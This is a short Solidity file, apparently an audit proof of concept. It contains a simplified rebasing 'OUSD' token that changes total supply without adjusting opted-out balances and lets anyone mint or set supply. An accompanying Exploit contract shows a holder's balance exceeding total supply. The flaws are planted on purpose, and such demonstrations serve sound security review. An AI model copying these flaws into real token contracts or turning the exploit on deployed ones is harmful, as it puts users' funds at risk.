// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract OUSD {
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public nonRebasing;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function rebaseOptOut() external { nonRebasing[msg.sender] = true; }

    function changeSupply(uint256 newSupply) external {
        // @> Supply changes without adjusting opted-out account balances.
        totalSupply = newSupply;
    }
}

contract Exploit {
    event Proof(uint256 userBalance, uint256 supply);
    function run() external {
        OUSD token = new OUSD();
        token.mint(address(this), 100);
        token.rebaseOptOut();
        token.changeSupply(1);
        emit Proof(token.balanceOf(address(this)), token.totalSupply());
        require(token.balanceOf(address(this)) > token.totalSupply(), "supply invariant held");
    }
}
